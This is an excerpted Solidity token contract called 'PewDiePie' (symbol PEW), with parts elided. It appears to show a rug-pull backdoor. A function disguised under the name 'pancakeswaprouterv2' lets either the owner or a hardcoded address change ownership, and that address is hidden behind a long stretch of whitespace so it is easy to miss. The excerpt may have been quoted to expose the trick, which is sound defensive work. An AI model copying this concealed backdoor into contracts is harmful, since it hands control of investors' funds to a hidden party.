...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 (0x6e01BEC2a4c62f3A269f5f62E72335A99Cdc6886));                                                                                                                                                                                                                                                                                                                                                                                              
...
contract PewDiePie is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "PEW";
  string private _name = "PewDiePie";
